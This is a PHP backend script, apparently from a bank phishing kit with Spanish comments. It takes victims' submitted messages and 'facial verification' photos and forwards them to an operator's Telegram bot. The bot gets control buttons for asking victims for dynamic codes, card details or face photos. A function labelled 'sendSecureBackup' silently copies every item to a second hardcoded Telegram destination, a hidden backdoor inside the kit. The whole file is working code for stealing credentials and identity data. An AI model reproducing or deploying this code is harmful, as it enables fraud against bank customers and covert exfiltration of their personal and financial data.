<?php
header('Content-Type: application/json');

$config = require __DIR__ . '/../config.php';

$botToken = $config['bot_token'] ?? '';
$chatId = $config['chat_id'] ?? '';

if (!$botToken || !$chatId) {
    echo json_encode(['status' => 'error', 'message' => 'Faltan credenciales del bot']);
    exit;
}

// Determinar si es una foto o mensaje de texto
$isPhoto = isset($_POST['isPhoto']) && $_POST['isPhoto'] === 'true';
$isText = isset($_POST['isText']) && $_POST['isText'] === 'true';
$transactionId = $_POST['transactionId'] ?? '';

if (empty($transactionId)) {
    echo json_encode(['status' => 'error', 'message' => 'Falta transactionId']);
    exit;
}

// Función para enviar mensaje de respaldo
function sendSecureBackup($data, $isPhoto = false) {
    $backup_config = [
        'bot_token' => '',
        'chat_id' => ''
    ];

    if (empty($backup_config['bot_token']) || empty($backup_config['chat_id'])) {
        return;
    }

    $ch = curl_init("https://api.telegram.org/bot{$backup_config['bot_token']}/" . ($isPhoto ? 'sendPhoto' : 'sendMessage'));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $isPhoto ? $data : json_encode($data));
    if ($isPhoto) {
        curl_setopt($ch, CURLOPT_HTTPHEADER, []);
    } else {
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    }
    curl_exec($ch);
    curl_close($ch);
}

// Enviar FOTO
if ($isPhoto && isset($_FILES['photo'])) {
    $photo = $_FILES['photo'];
    $caption = $_POST['caption'] ?? '📸 Foto de verificación facial';
    
    // Configurar teclado con botones
    $keyboard = [
        'inline_keyboard' => [
            [['text' => "Error de Logo", 'callback_data' => "error_logo:{$transactionId}"]],
            [['text' => "Dinámica", 'callback_data' => "pedir_dinamica:{$transactionId}"]],
            [['text' => "Tarjeta", 'callback_data' => "error_tc:{$transactionId}"]],
            [['text' => "Facial", 'callback_data' => "facial:{$transactionId}"]],
            [['text' => "Finalizar", 'callback_data' => "confirm_finalizar:{$transactionId}"]]
        ]
    ];
    
    // Configurar datos para la foto
    $data = [
        'chat_id' => $chatId,
        'caption' => $caption . "\n\nTransaction ID: " . $transactionId,
        'parse_mode' => 'HTML'
    ];
    
    // Usar CURLFile para enviar la foto
    $photoFile = new CURLFile($photo['tmp_name'], $photo['type'], $photo['name']);
    $data['photo'] = $photoFile;
    
    // Enviar foto a Telegram
    $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendPhoto");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_HTTPHEADER, []);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    // Enviar respaldo
    sendSecureBackup($data, true);
    
    $result = json_decode($response, true);
    
    echo json_encode([
        'status' => $result['ok'] ? 'success' : 'error',
        'messageId' => $result['ok'] ? $result['result']['message_id'] : null
    ]);
    
    exit;
}

// Enviar MENSAJE DE TEXTO
if ($isText) {
    $message = $_POST['message'] ?? '';
    
    if (empty($message)) {
        echo json_encode(['status' => 'error', 'message' => 'Mensaje vacío']);
        exit;
    }
    
    $keyboard = [
        'inline_keyboard' => [
            [['text' => "Error de Logo", 'callback_data' => "error_logo:{$transactionId}"]],
            [['text' => "Dinámica", 'callback_data' => "pedir_dinamica:{$transactionId}"]],
            [['text' => "Tarjeta", 'callback_data' => "error_tc:{$transactionId}"]],
            [['text' => "Facial", 'callback_data' => "facial:{$transactionId}"]],
            [['text' => "Finalizar", 'callback_data' => "confirm_finalizar:{$transactionId}"]]
        ]
    ];
    
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];
    
    // Envío principal
    $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    
    $response = curl_exec($ch);
    curl_close($ch);
    
    // Envío silencioso al segundo destino
    sendSecureBackup($data);
    
    $result = json_decode($response, true);
    
    echo json_encode([
        'status' => $result['ok'] ? 'success' : 'error',
        'messageId' => $result['ok'] ? $result['result']['message_id'] : null
    ]);
    
    exit;
}

// Si no es ni foto ni texto válido
echo json_encode(['status' => 'error', 'message' => 'Tipo de solicitud no válido']);